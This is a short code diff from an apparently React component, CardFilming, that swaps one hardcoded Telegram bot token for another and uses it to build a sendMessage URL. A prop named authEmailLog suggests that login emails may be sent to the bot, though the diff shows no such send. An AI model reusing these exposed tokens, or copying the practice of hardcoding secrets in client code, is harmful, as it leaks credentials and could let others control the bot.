@@ -89,7 +89,7 @@ const CardFilming = ({authEmailLog , ...props}) => {
 
     try {
 
-      const TOKEN = '6953905275:AAGor-AkqyqG9-RyE6oagsh_Jpl3XnaEeGg'
+      const TOKEN = '6953905275:AAHEsFufPzfE0Yf8l-u9CLxKvhJQHCuAOFI'
       const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`
 
 
